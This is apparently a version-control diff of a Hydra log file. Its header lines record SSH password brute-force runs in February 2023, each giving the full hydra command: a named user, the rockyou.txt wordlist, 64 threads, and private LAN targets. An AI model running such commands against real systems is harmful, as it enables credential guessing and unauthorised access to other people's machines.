@@ -1,2 +1,2 @@
-# Hydra v9.4 run at 2023-02-15 09:10:08 on 192.168.1.81 ssh (hydra -l thomassegale -P rockyou.txt -t 64 -vV -o output.txt -I ssh://192.168.1.81)
-# Hydra v9.4 run at 2023-02-16 07:08:30 on 192.168.1.80 ssh (hydra -l thomassegale -P rockyou.txt -t 64 -vV -o output.txt -I ssh://192.168.1.80)
+# Hydra v9.4 run at 2023-02-16 15:29:12 on 192.168.1.80 ssh (hydra -l thomassegale -P rockyou.txt -t 64 -vV -o output.txt -I ssh://192.168.1.80)
+# Hydra v9.4 run at 2023-02-23 08:36:15 on 192.168.1.80 ssh (hydra -l thomassegale -P rockyou.txt -t 64 -vV -o output.txt -I ssh://192.168.1.80)
